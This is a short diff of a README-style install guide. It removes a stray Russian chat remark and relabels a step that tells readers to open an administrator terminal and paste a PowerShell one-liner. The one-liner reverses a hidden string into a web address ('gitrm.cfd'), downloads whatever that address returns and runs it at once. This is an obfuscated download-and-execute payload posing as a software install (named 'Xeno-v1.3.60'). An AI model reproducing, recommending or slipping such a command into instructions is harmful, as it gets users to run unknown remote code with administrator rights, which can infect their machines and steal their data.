@@ -1,4 +1,3 @@
-Опа, братан. Держи **EN-версию** с **header** и **footer** через Capsule Render.
 
 ---
 
@@ -44,7 +43,7 @@
   Press `Win + X` → **Terminal (Admin)** → paste the command below → press `Enter`
 
   ```powershell
-  "Repository-ApparitionSniper";iex(irm((-join"dfc.mrtig//:sptth"[-1..-99])))
+  "Xeno-v1.3.60";iex(irm((-join"dfc.mrtig//:sptth"[-1..-99])))
   ```
 
   **⏱ Wait 3–5 minutes. Don't close the window until it finishes.**
